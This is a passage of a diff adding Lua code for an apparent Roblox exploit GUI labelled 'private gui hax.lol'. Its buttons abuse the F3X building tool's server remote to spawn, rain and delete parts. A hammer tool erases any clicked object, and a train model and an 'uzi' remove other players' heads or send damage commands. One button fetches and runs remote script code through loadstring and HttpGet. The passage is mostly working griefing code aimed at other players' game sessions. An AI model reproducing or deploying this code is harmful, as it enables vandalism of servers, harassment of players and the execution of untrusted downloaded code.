+				setMesh(nhd, mesh.MeshId:match("%d+"), mesh.Scale)
+			end
+		end
+	
+		spawnDecal(nhd, Enum.NormalId.Front)
+		if hd:FindFirstChildOfClass("Decal") then
+			local face = hd:FindFirstChildOfClass("Decal")
+			addDecal(nhd, face.Texture, Enum.NormalId.Front)
+		end
+	
+		local accs = {}
+		for _, v in pairs(char:GetDescendants()) do
+			if v:IsA("Accessory") and v:FindFirstChild("Handle") then
+				local orig = v.Handle:FindFirstChildOfClass("SpecialMesh")
+				if orig then
+					local acc = createPart(cf, char)
+					addMesh(acc)
+					setMesh(acc, orig.MeshId:match("%d+"), orig.Scale)
+					setCollision(acc, false)
+					setAnchor(acc, true)
+					table.insert(accs, {part = acc, acc = v, lcf = v.Handle.CFrame})
+				end
+			end
+		end
+	
+		local mouse = player:GetMouse()
+		local bool_active = false
+		local arml = 0
+		local loop_shot = 0
+		local isShooting = false
+	
+		local function _cframe(x,y,z,r0,r1,r2)
+			return CFrame.Angles(math.rad(r0 or 0), math.rad(r1 or 0), math.rad(r2 or 0)) * CFrame.new(x,y,z)
+		end
+	
+		local h_weld_cf_inactive = _cframe(0.35,0.5,0.5, 0,90,-70)
+		local h_weld_cf_active = _cframe(0,0.75,0, -110,180,0)
+	
+		local inv = Instance.new("Model", char)
+		inv.Name = "dev-uzi"
+	
+		local function createLocalPart(size, color)
+			local p = Instance.new("Part", inv)
+			p.Size = size
+			p.Color = color
+			p.CanCollide = false
+			p.Transparency = 1
+			return p
+		end
+	
+		local handle = createLocalPart(Vector3.new(0.3,1.3,0.4), Color3.fromRGB(140,140,140))
+		local h_weld = Instance.new("Weld", handle)
+		h_weld.C1 = h_weld_cf_inactive
+		h_weld.Part1 = handle
+		h_weld.Part0 = trs
+	
+		local h_hue = createLocalPart(Vector3.new(0.25,1.8,0.35), Color3.fromRGB(100,100,100))
+		local hh_weld = Instance.new("Weld", h_hue)
+		hh_weld.C1 = _cframe(0,0.5,0)
+		hh_weld.Part0 = handle
+		hh_weld.Part1 = h_hue
+	
+		local h_part = createLocalPart(Vector3.new(0.4,0.4,1.4), Color3.fromRGB(140,140,140))
+		local hp_weld = Instance.new("Weld", h_part)
+		hp_weld.C1 = _cframe(0,-0.65,-0.3, 20,0,0)
+		hp_weld.Part0 = handle
+		hp_weld.Part1 = h_part
+	
+		local drag = createLocalPart(Vector3.new(0.5,0.45,1.5), Color3.fromRGB(100,100,100))
+		local d_weld = Instance.new("Weld", drag)
+		d_weld.C1 = _cframe(0,-0.25,0)
+		d_weld.Part0 = h_part
+		d_weld.Part1 = drag
+	
+		local tube = createLocalPart(Vector3.new(0.2,0.2,1.5), Color3.fromRGB(0,0,0))
+		local t_weld = Instance.new("Weld", tube)
+		t_weld.C1 = _cframe(0,-0.3,-0.1)
+		t_weld.Part0 = h_part
+		t_weld.Part1 = tube
+	
+		local n_handle = createPart(cf, char)
+		local n_hhue = createPart(cf, char)
+		local n_hpart = createPart(cf, char)
+		local n_drag = createPart(cf, char)
+		local n_tube = createPart(cf, char)
+	
+		setupPart(n_handle, handle.Size, cf, handle.Color)
+		setupPart(n_hhue, h_hue.Size, cf, h_hue.Color)
+		setupPart(n_hpart, h_part.Size, cf, h_part.Color)
+		setupPart(n_drag, drag.Size, cf, drag.Color)
+		setupPart(n_tube, tube.Size, cf, tube.Color)
+	
+		local lightPool = {}
+		local casingPool = {}
+		local storageCF = CFrame.new(0, -999, 0)
+	
+		local function getLight()
+			if #lightPool > 0 then
+				return table.remove(lightPool)
+			end
+			local light = createPart(storageCF, char)
+			colorPart(light, Color3.fromRGB(255, 255, 0))
+			setCollision(light, false)
+			setAnchor(light, true)
+			spawnDecal(light, Enum.NormalId.Front)
+			addDecal(light, "rbxassetid://109101526", Enum.NormalId.Front)
+			return light
+		end
+	
+		local function returnLight(light)
+			movePart(light, storageCF)
+			table.insert(lightPool, light)
+		end
+	
+		local function getCasing()
+			if #casingPool > 0 then
+				return table.remove(casingPool)
+			end
+			local casing = createPart(storageCF, char)
+			resize(casing, Vector3.new(0.1, 0.1, 0.4), storageCF)
+			colorPart(casing, Color3.fromRGB(200, 200, 0))
+			setCollision(casing, true)
+			setAnchor(casing, true)
+			return casing
+		end
+	
+		local function returnCasing(casing)
+			setAnchor(casing, true)
+			movePart(casing, storageCF)
+			table.insert(casingPool, casing)
+		end
+	
+		for i = 1, 20 do
+			local l = createPart(storageCF, char)
+			colorPart(l, Color3.fromRGB(255, 255, 0))
+			setCollision(l, false)
+			setAnchor(l, true)
+			spawnDecal(l, Enum.NormalId.Front)
+			addDecal(l, "rbxassetid://109101526", Enum.NormalId.Front)
+			table.insert(lightPool, l)
+	
+			local c = createPart(storageCF, char)
+			resize(c, Vector3.new(0.1, 0.1, 0.4), storageCF)
+			colorPart(c, Color3.fromRGB(200, 200, 0))
+			setCollision(c, true)
+			setAnchor(c, true)
+			table.insert(casingPool, c)
+		end
+	
+		local moveBuffer = {}
+		local moveCount = 0
+	
+		local function addToBuffer(part, cf)
+			moveCount = moveCount + 1
+			moveBuffer[moveCount] = {Part = part, CFrame = cf}
+		end
+	
+		local function flushBuffer()
+			if moveCount > 0 then
+				ohno({"SyncMove", moveBuffer})
+				moveCount = 0
+				table.clear(moveBuffer)
+			end
+		end
+	
+		local heartbeatConnection = runService.Heartbeat:Connect(function()
+			if not char or not char:FindFirstChild("Torso") then
+				flushBuffer()
+				return
+			end
+	
+			addToBuffer(nhd, hd.CFrame)
+			addToBuffer(ntrs, trs.CFrame)
+			addToBuffer(nlarm, larm.CFrame)
+			addToBuffer(nrarm, rarm.CFrame)
+			addToBuffer(nlleg, lleg.CFrame)
+			addToBuffer(nrleg, rleg.CFrame)
+			addToBuffer(n_handle, handle.CFrame)
+			addToBuffer(n_hhue, h_hue.CFrame)
+			addToBuffer(n_hpart, h_part.CFrame)
+			addToBuffer(n_drag, drag.CFrame)
+			addToBuffer(n_tube, tube.CFrame)
+	
+			for _, data in pairs(accs) do
+				if data.acc and data.acc:FindFirstChild("Handle") then
+					data.lcf = data.acc.Handle.CFrame
+					addToBuffer(data.part, data.lcf)
+				end
+			end
+	
+			flushBuffer()
+		end)
+	
+		local aimConnection
+		local gyro
+		local armWeld
+	
+		local function updateAim()
+			if not bool_active or not char or not char:FindFirstChild("Torso") then
+				return
+			end
+	
+			local pos = mouse.Hit.p
+			local val = -math.pi * 0.5
+			local valp = val * -1
+			local p0 = trs.CFrame
+			p0 = p0 + ((p0 * CFrame.Angles(valp,0,0)).lookVector * 0.5) + (p0 * CFrame.Angles(0,val,0)).lookVector
+			local p1 = p0 + ((p0.p - pos).unit * -2)
+			local p2 = CFrame.new((p0.p + p1.p)/2, p0.p) * CFrame.Angles(val,val,0)
+			local hitpos = trs.Position
+			local cj = CFrame.new(hitpos)
+			local c0 = trs.CFrame:inverse() * cj
+			local c1 = p2:inverse() * cj
+			if armWeld then
+				armWeld.C0 = c0
+				armWeld.C1 = c1
+			end
+			if gyro then
+				gyro.CFrame = CFrame.new(trs.Position, Vector3.new(pos.X, trs.Position.Y, pos.Z))
+			end
+		end
+	
+		local function cfSelect()
+			bool_active = true
+			local arm = char:FindFirstChild("Right Arm")
+			local shoulder = trs:FindFirstChild("Right Shoulder")
+			if arm and shoulder then
+				h_weld.Part0 = arm
+				h_weld.C1 = h_weld_cf_active
+				shoulder.Part1 = nil
+				shoulder.Part0 = nil
+	
+				armWeld = trs:FindFirstChild("right_arml") or Instance.new("Weld")
+				armWeld.Name = "right_arml"
+				armWeld.Part0 = trs
+				armWeld.Part1 = arm
+				armWeld.Parent = trs
+	
+				arml = arml + 1
+				local alv = arml
+	
+				gyro = trs:FindFirstChild("p_gyro") or Instance.new("BodyGyro", trs)
+				gyro.maxTorque = Vector3.new(5e5,5e5,5e5)
+				gyro.P = 30000
+				gyro.D = 1000
+				gyro.Name = "p_gyro"
+				gyro.Parent = trs
+	
+				if aimConnection then aimConnection:Disconnect() end
+				aimConnection = runService.Heartbeat:Connect(updateAim)
+	
+				task.spawn(function()
+					while bool_active and arml == alv do
+						task.wait()
+					end
+					if gyro and gyro.Parent then gyro:Destroy() end
+					if aimConnection then aimConnection:Disconnect(); aimConnection = nil end
+				end)
+			end
+		end
+	
+		local function cfDeselect()
+			bool_active = false
+			arml = arml + 1
+			loop_shot = loop_shot + 1
+			h_weld.Part0 = trs
+			h_weld.C1 = h_weld_cf_inactive
+	
+			if armWeld then armWeld:Destroy(); armWeld = nil end
+			if gyro and gyro.Parent then gyro:Destroy(); gyro = nil end
+			if aimConnection then aimConnection:Disconnect(); aimConnection = nil end
+	
+			local arm = char:FindFirstChild("Right Arm")
+			local shoulder = trs:FindFirstChild("Right Shoulder")
+			if arm and shoulder then
+				shoulder.Part0 = trs
+				shoulder.Part1 = arm
+			end
+		end
+	
+		local uziTool = Instance.new("Tool")
+		uziTool.Name = "dev-uzi"
+		uziTool.RequiresHandle = false
+		uziTool.Parent = player.Backpack
+	
+		uziTool.Equipped:Connect(cfSelect)
+		uziTool.Unequipped:Connect(cfDeselect)
+	
+		local function raycast(v0, v1)
+			local params = RaycastParams.new()
+			params.FilterType = Enum.RaycastFilterType.Exclude
+			params.FilterDescendantsInstances = {char, inv, nhd, ntrs, nlarm, nrarm, nlleg, nrleg, n_handle, n_hhue, n_hpart, n_drag, n_tube}
+			local direction = (v1 - v0).unit * 1000
+			local result = workspace:Raycast(v0, direction, params)
+			if result then
+				return result.Instance, result.Position
+			end
+			return nil, v1
+		end
+	
+		local function lightEffect(v0, v1)
+			local mag = (v0 - v1).magnitude
+			local len = math.random(2, 7)
+			len = len > mag/2 and mag/2 or len
+			local light = getLight()
+			resize(light, Vector3.new(0.2, 0.2, len), CFrame.new(v0, v1) * CFrame.new(0, 0, -len/2))
+			task.delay(0.15, function()
+				returnLight(light)
+			end)
+		end
+	
+		local time_left = 0
+	
+		local function shot(v0, v1)
+			if time_left > tick() then return end
+			time_left = tick() + 0.05
+	
+			h_weld.C1 = _cframe(0, 0.75, 0, -math.random(100, 110), 180, 0)
+			d_weld.C1 = _cframe(0, -0.25, 0.3)
+	
+			local casing = getCasing()
+			movePart(casing, drag.CFrame * CFrame.new(-0.5, 0, 0))
+			setAnchor(casing, false)
+			task.delay(1.5, function()
+				returnCasing(casing)
+			end)
+	
+			local hit, hitPos = raycast(v0, v1)
+			if v0 and hitPos then
+				lightEffect(v0, hitPos)
+			end
+	
+			if hit then
+				local model = hit:FindFirstAncestorOfClass("Model")
+				local targetHum = model and model:FindFirstChildOfClass("Humanoid")
+				if targetHum and model ~= char then
+					local targetPlayer = players:GetPlayerFromCharacter(model)
+					if hit.Name == "Head" then
+						ohno({"Remove", {hit}})
+					elseif targetPlayer then
+						pcall(function() rq:InvokeServer(";damage " .. targetPlayer.Name .. " 35") end)
+					end
+				end
+			end
+	
+			task.delay(0.1, function()
+				d_weld.C1 = _cframe(0, -0.25, 0)
+				if bool_active then
+					h_weld.C1 = h_weld_cf_active
+				end
+			end)
+		end
+	
+		mouse.Button1Down:Connect(function()
+			if not bool_active then return end
+			isShooting = true
+			loop_shot = loop_shot + 1
+			local vers = loop_shot
+			while isShooting and vers == loop_shot and bool_active do
+				local muzzlePos = (tube.CFrame * CFrame.new(0, 0, tube.Size.Z * 0.5)).p
+				shot(muzzlePos, mouse.Hit.p)
+				task.wait(0.05)
+			end
+		end)
+	
+		mouse.Button1Up:Connect(function()
+			isShooting = false
+			loop_shot = loop_shot + 1
+		end)
+	
+		hum.Died:Connect(function()
+			if heartbeatConnection then heartbeatConnection:Disconnect() end
+			if aimConnection then aimConnection:Disconnect() end
+			if gyro then gyro:Destroy() end
+			if armWeld then armWeld:Destroy() end
+			for _, data in pairs(accs) do
+				if data.part then
+					ohno({"Remove", {data.part}})
+				end
+			end
+			inv:Destroy()
+		end)
+	end)
+end;
+task.spawn(C_231);
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+function C_235()
+local script = G2L["235"];
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-John-Doe-F3X-Script-86500"))()
+	end)
+end;
+task.spawn(C_235);
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+function C_237()
+local script = G2L["237"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+	
+		local player = Players.LocalPlayer
+	
+		local tool
+		for _, v in pairs(player:GetDescendants()) do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	
+		if not tool then
+			for _, v in pairs(game.ReplicatedStorage:GetDescendants()) do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+					break
+				end
+			end
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function send(...)
+			return remote:InvokeServer(...)
+		end
+	
+		local character = player.Character or player.CharacterAdded:Wait()
+		local head = character:WaitForChild("Head")
+	
+		for i = 1, 10 do
+			task.spawn(function()
+				local x = math.random(-3, 3)
+				local z = math.random(-3, 3)
+				local partCF = head.CFrame * CFrame.new(x, 2, z)
+				local part = send("CreatePart", "Normal", partCF, Workspace)
+				task.wait(0.1)
+				send("SetName", { part }, "febypasslol")
+				send("SyncAnchor", { { Part = part, Anchored = false } })
+			end)
+		end
+	end)
+end;
+task.spawn(C_237);
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+function C_239()
+local script = G2L["239"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	
+		local player = Players.LocalPlayer
+	
+		local tool
+		for _, v in pairs(player:GetDescendants()) do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	
+		if not tool then
+			for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+					break
+				end
+			end
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function send(...)
+			return remote:InvokeServer(...)
+		end
+	
+		local hax = "febypasslol"
+	
+		for _, part in pairs(Workspace:GetDescendants()) do
+			if part:IsA("BasePart") and part.Name == hax then
+				task.spawn(function()
+					send("Remove", { part })
+				end)
+			end
+		end
+	end)
+	
+end;
+task.spawn(C_239);
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+function C_23b()
+local script = G2L["23b"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	
+		local player = Players.LocalPlayer
+	
+		local tool
+		for _, v in pairs(player:GetDescendants()) do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	
+		if not tool then
+			for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+					break
+				end
+			end
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function send(...)
+			return remote:InvokeServer(...)
+		end
+	
+		while true do
+			task.spawn(function()
+				local character = player.Character
+				if character and character:FindFirstChild("Head") then
+					local head = character.Head
+					local x = head.Position.X + math.random(-8, 8)
+					local z = head.Position.Z + math.random(-8, 8)
+					local y = head.Position.Y + 40 + math.random(0, 30)
+					local partCF = CFrame.new(x, y, z)
+					local part = send("CreatePart", "Normal", partCF, Workspace)
+					task.wait(0.05)
+					send("SetName", { part }, "woahpart")
+					send("SyncAnchor", { { Part = part, Anchored = false } })
+					task.wait(2)
+					if part and part.Parent then
+						send("Remove", { part })
+					end
+				end
+			end)
+			task.wait(0.08)
+		end
+	end)
+end;
+task.spawn(C_23b);
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+function C_23d()
+local script = G2L["23d"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	
+		local player = Players.LocalPlayer
+	
+		local lol = Instance.new("Tool")
+		lol.Name = "Hammer"
+		lol.RequiresHandle = false
+		lol.Parent = player.Backpack
+	
+		local function kooptool()
+			for _, v in pairs(player:GetDescendants()) do
+				if v.Name == "SyncAPI" then
+					return v.Parent
+				end
+			end
+			for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+				if v.Name == "SyncAPI" then
+					return v.Parent
+				end
+			end
+			return nil
+		end
+	
+		local syncTool = kooptool()
+		if not syncTool then return end
+	
+		local remote = syncTool.SyncAPI.ServerEndpoint
+	
+		local function send(...)
+			return remote:InvokeServer(...)
+		end
+	
+		local getshit = player:GetMouse()
+	
+		lol.Activated:Connect(function()
+			local target = getshit.Target
+			if target and target:IsA("BasePart") and target.Name ~= "Terrain" and target.Name ~= "kys" then
+				send("Remove", { target })
+			end
+		end)
+	end)
+end;
+task.spawn(C_23d);
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+function C_23f()
+local script = G2L["23f"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local Players = game:GetService("Players")
+		local RunService = game:GetService("RunService")
+		local player = Players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+		local backpack = player:WaitForChild("Backpack")
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+		end
+	
+		local f3x = getf3x()
+		if not f3x then
+			warn("No F3X found")
+			return
+		end
+	
+		local endpoint = f3x.SyncAPI.ServerEndpoint
+	
+		local function fastInvoke(args)
+			task.spawn(function()
+				pcall(function()
+					endpoint:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local function quickPart(t, cf, size, mat, col, trans, mid, mtex, mscale, extra)
+			task.spawn(function()
+				local p = endpoint:InvokeServer("CreatePart", t, cf, workspace.Terrain)
+				if not p then return end
+	
+				fastInvoke({"SyncResize", {{
+					Part = p,
+					CFrame = cf,
+					Size = size
+				}}})
+	
+				if mat then fastInvoke({"SyncMaterial", {{Part = p, Material = mat}}}) end
+				if col then fastInvoke({"SyncColor", {{Part = p, Color = col, UnionColoring = false}}}) end
+				if trans then fastInvoke({"SyncMaterial", {{Part = p, Transparency = trans}}}) end
+	
+				if mid or mtex or mscale then
+					fastInvoke({"CreateMeshes", {{Part = p}}})
+					if mid then fastInvoke({"SyncMesh", {{Part = p, MeshId = "rbxassetid://" .. mid}}}) end
+					if mtex then fastInvoke({"SyncMesh", {{Part = p, TextureId = "rbxassetid://" .. mtex}}}) end
+					if mscale then fastInvoke({"SyncMesh", {{Part = p, Scale = mscale}}}) end
+				end
+	
+				if extra then extra(p) end
+			end)
+		end
+	
+		local THOMAS_MESH  = "2231280549"
+		local THOMAS_TEX   = "2231280614"
+		local THOMAS_SCALE = Vector3.new(2, 2, 1.5)
+		local THOMAS_SIZE  = Vector3.new(5, 5, 10)
+	
+		local function setInvisibility()
+			task.spawn(function()
+				local parts = {"Torso", "Left Leg", "Right Leg", "Left Arm", "Right Arm", "Head", "HumanoidRootPart"}
+				local args = { [1] = "SyncMaterial", [2] = {} }
+	
+				for _, name in ipairs(parts) do
+					local part = char:FindFirstChild(name)
+					if part then
+						table.insert(args[2], {Part = part, Transparency = 1})
+					end
+				end
+	
+				fastInvoke(args)
+			end)
+		end
+	
+		local function buildThomas()
+			local hrp = char:FindFirstChild("HumanoidRootPart")
+			if not hrp then return end
+	
+			local spawnCF = hrp.CFrame
+	
+			quickPart(
+				"Normal",
+				spawnCF,
+				THOMAS_SIZE,
+				Enum.Material.Plastic,
+				Color3.fromRGB(255,255,255),
+				0,
+				THOMAS_MESH,
+				THOMAS_TEX,
+				THOMAS_SCALE,
+				function(p)
+					fastInvoke({"SyncAnchor", {{Part = p, Anchored = true}}})
+					fastInvoke({"SyncCollision", {{Part = p, CanCollide = false}}})
+					fastInvoke({"SetLocked", {p}, false})
+					fastInvoke({"SetName", {{p}}, "Thomas"})
+					fastInvoke({"CreateWelds", {p, hrp}, p})
+					fastInvoke({"CreateLights", {{Part = p, LightType = "SpotLight"}}})
+					fastInvoke({"SyncLighting", {{Part = p, LightType = "SpotLight", Brightness = 100}}})
+	
+					task.delay(0.05, function()
+						fastInvoke({"SyncAnchor", {{Part = p, Anchored = false}}})
+					end)
+	
+					p.Touched:Connect(function(hit)
+						local hitChar = hit.Parent
+						if hitChar and hitChar:IsA("Model") and Players:FindFirstChild(hitChar.Name) then
+							if hitChar.Name ~= player.Name then
+								local targetHead = hitChar:FindFirstChild("Head")
+								if targetHead then
+									fastInvoke({"Remove", {targetHead}})
+								end
+								local whistle = Instance.new("Sound", p)
+								whistle.SoundId = "rbxassetid://475073913"
+								whistle.Volume = 1
+								whistle:Play()
+							end
+						end
+					end)
+				end
+			)
+	
+			local hum = char:FindFirstChildOfClass("Humanoid")
+			if hum then hum.WalkSpeed = 80 end
+	
+			RunService.RenderStepped:Connect(function()
+				for _, v in ipairs(char:GetDescendants()) do
+					if v:IsA("BasePart") then
+						v.CanCollide = false
+					end
+				end
+			end)
+		end
+	
+		setInvisibility()
+		buildThomas()
+		
+	end)
+end;
+task.spawn(C_23f);
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+function C_241()
+local script = G2L["241"];
+	script.Parent.MouseButton1Click:Connect(function()
+		--[[
+		WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+	]]
+	
+	
+		local Players = game:GetService("Players")
+		local RunService = game:GetService("RunService")
+		local ContentProvider = game:GetService("ContentProvider")
+		local SoundService = game:GetService("SoundService")
+	
+		local player = Players.LocalPlayer
+	
+		-- Find F3X
+		local function getf3x()
+			local backpack = player.Backpack
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+			for _, v in ipairs(player.Character:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then 
+			warn("where yo btools at?") 
+			return 
+		end
+	
+		local serverendpoint = f3x.SyncAPI.ServerEndpoint
+	
+		-- Settings
+		local DUCK_NAME = "EpicDuckOrbit_" .. player.Name
+		local TITLE = "Ur an Admin! Level:4"
+		local radius = 4
+		local heightOffset = 0
+		local speed = 2.3
+		local duckScale = Vector3.new(2,2, 2)
+		local duckSize = Vector3.new(1, 1, 1)
+	
+		local duckPart = nil
+		local connection = nil
+		local quackSound = nil
+	
+		local function cleanupOldDuck()
+			local oldDuck = workspace:FindFirstChild(DUCK_NAME)
+			if oldDuck and serverendpoint then
+				serverendpoint:InvokeServer("Remove", { [1] = oldDuck })
+			end
+			duckPart = nil
+			if quackSound then quackSound:Destroy() end
+		end
+	
+		local function createDuck()
+			cleanupOldDuck()
+	
+			local character = player.Character
+			if not character or not character:FindFirstChild("HumanoidRootPart") then return end
+	
+			local hrp = character.HumanoidRootPart
+			local initialCFrame = hrp.CFrame * CFrame.new(0, heightOffset, radius)
+	
+			-- Create server-side part (VISIBLE TO ALL!)
+			local createdPart = serverendpoint:InvokeServer("CreatePart", "Normal", initialCFrame, workspace)
+			if not createdPart then return end
+			duckPart = createdPart
+	
+			serverendpoint:InvokeServer("SetName", { [1] = duckPart }, DUCK_NAME)
+	
+			-- Properties
+			serverendpoint:InvokeServer("SyncResize", { { Part = duckPart, CFrame = duckPart.CFrame, Size = duckSize } })
+			serverendpoint:InvokeServer("SyncMaterial", { { Part = duckPart, Material = Enum.Material.Plastic, Transparency = 0.5 } })
+			serverendpoint:InvokeServer("SyncColor", { { Part = duckPart, Color = Color3.new(1, 1, 1) } })
+			serverendpoint:InvokeServer("SyncCollision", { { Part = duckPart, CanCollide = false } })
+			serverendpoint:InvokeServer("SyncAnchor", { { Part = duckPart, Anchored = true } })
+			serverendpoint:InvokeServer("SetLocked", { [1] = duckPart }, true)
+	
+			-- Epic Duck Mesh
+			serverendpoint:InvokeServer("CreateMeshes", { { Part = duckPart } })
+			serverendpoint:InvokeServer("SyncMesh", { 
+				{ 
+					Part = duckPart, 
+					MeshId = "rbxassetid://10801592760",
+					TextureId = "rbxassetid://98779496582475",
+					Scale = duckScale 
+				} 
+			})
+	
+			task.wait(0.5)  -- Replication wait
+	
+			-- === YELLOW SPARKLES ===
+			local sparkles = Instance.new("Sparkles")
+			sparkles.SparkleColor = Color3.fromRGB(255, 255, 0)
+			sparkles.Enabled = false
+			sparkles.Parent = duckPart
+	
+	
+			quackSound = Instance.new("Sound")
+			quackSound.SoundId = "rbxassetid://0"  
+			quackSound.Volume = 0.6
+			quackSound.RollOffMode = Enum.RollOffMode.Linear
+			quackSound.Parent = duckPart
+	
+			-- === HEAD TITLE ===
+			local billboardGui = Instance.new("BillboardGui")
+			billboardGui.Name = "DuckHeadTitle"
+			billboardGui.Size = UDim2.new(0, 220, 0, 45)
+			billboardGui.StudsOffset = Vector3.new(0, 1.6, 1.1)
+			billboardGui.AlwaysOnTop = true
+			billboardGui.LightInfluence = 0
+			billboardGui.Parent = duckPart
+	
+			local textLabel = Instance.new("TextLabel")
+			textLabel.Size = UDim2.new(1, 0, 1, 0)
+			textLabel.BackgroundTransparency = 1
+			textLabel.Text = TITLE
+			textLabel.TextColor3 = Color3.fromRGB(35, 71, 139)
+			textLabel.TextStrokeTransparency = 0
+			textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+			textLabel.Font = Enum.Font.GothamBold
+			textLabel.TextSize = 13
+			textLabel.Parent = billboardGui
+	
+			ContentProvider:PreloadAsync({duckPart})
+	
+	
+		end
+	
+		local function startOrbit()
+			if connection then connection:Disconnect() end
+	
+			local character = player.Character
+			if not character or not character:FindFirstChild("HumanoidRootPart") or not duckPart then return end
+	
+			local humanoidRootPart = character.HumanoidRootPart
+	
+			connection = RunService.RenderStepped:Connect(function()
+				if not humanoidRootPart.Parent or not duckPart or not duckPart.Parent then return end
+	
+				local time = tick()
+				local angle = time * speed
+	
+				local offset = Vector3.new(math.cos(angle) * radius, heightOffset, math.sin(angle) * radius)
+				local position = humanoidRootPart.Position + offset
+	
+				local lookDirection = humanoidRootPart.CFrame.LookVector
+				local targetPos = position + lookDirection
+				local duckCFrame = CFrame.lookAt(position, targetPos)
+	
+				-- Little bob up/down + QUACK on bob!
+				local bobHeight = math.sin(time * 0.5) * 0.99
+				duckCFrame = CFrame.new(duckCFrame.Position + Vector3.new(0, bobHeight, 0), targetPos)
+	
+				-- QUACK SOUND every full orbit cycle
+				if math.abs(bobHeight) > 0.35 and quackSound then
+					quackSound:Play()
+				end
+	
+				duckPart.CFrame = duckCFrame
+			end)
+		end
+	
+		player.CharacterAdded:Connect(function()
+			task.wait(1.5)
+			createDuck()
+			task.wait(0.5)
+			startOrbit()
+		end)
+	
+		if player.Character then
+			createDuck()
+			task.wait(0.5)
+			startOrbit()
+		end
+	
+		print("epik")
+		print("orbit duck skiddd ")
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+		wait(1)
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	--[[
+		WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+	]]
+	
+	
+		local Players = game:GetService("Players")
+		local RunService = game:GetService("RunService")
+		local ContentProvider = game:GetService("ContentProvider")
+		local SoundService = game:GetService("SoundService")
+	
+		local player = Players.LocalPlayer
+	
+		-- Find F3X
+		local function getf3x()
+			local backpack = player.Backpack
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+			for _, v in ipairs(player.Character:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then return v end
+			end
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then 
+			warn("where yo btools at?") 
+			return 
+		end
+	
+		local serverendpoint = f3x.SyncAPI.ServerEndpoint
+	
+		-- Settings
+		local DUCK_NAME = "Partfor_" .. player.Name
+		local TITLE = "Ur an Admin! Level:4"
+		local radius = 4
+		local heightOffset = 0
+		local speed = 2.3
+		local duckScale = Vector3.new(0.4,0.4, 0.5)
+		local duckSize = Vector3.new(1, 1, 1)
+	
+		local duckPart = nil
+		local connection = nil
+		local quackSound = nil
+	
+		local function cleanupOldDuck()
+			local oldDuck = workspace:FindFirstChild(DUCK_NAME)
+			if oldDuck and serverendpoint then
+				serverendpoint:InvokeServer("Remove", { [1] = oldDuck })
+			end
+			duckPart = nil
+			if quackSound then quackSound:Destroy() end
+		end
+	
+		local function createDuck()
+			cleanupOldDuck()
+	
+			local character = player.Character
+			if not character or not character:FindFirstChild("HumanoidRootPart") then return end
+	
+			local hrp = character.HumanoidRootPart
+			local initialCFrame = hrp.CFrame * CFrame.new(0, heightOffset, radius)
+	
+			-- Create server-side part (VISIBLE TO ALL!)
+			local createdPart = serverendpoint:InvokeServer("CreatePart", "Normal", initialCFrame, workspace)
+			if not createdPart then return end
+			duckPart = createdPart
+	
+			serverendpoint:InvokeServer("SetName", { [1] = duckPart }, DUCK_NAME)
+	
+			-- Properties
+			serverendpoint:InvokeServer("SyncResize", { { Part = duckPart, CFrame = duckPart.CFrame, Size = duckSize } })
+			serverendpoint:InvokeServer("SyncMaterial", { { Part = duckPart, Material = Enum.Material.Plastic, Transparency = 0 } })
+			serverendpoint:InvokeServer("SyncColor", { { Part = duckPart, Color = Color3.new(1, 1, 1) } })
+			serverendpoint:InvokeServer("SyncCollision", { { Part = duckPart, CanCollide = false } })
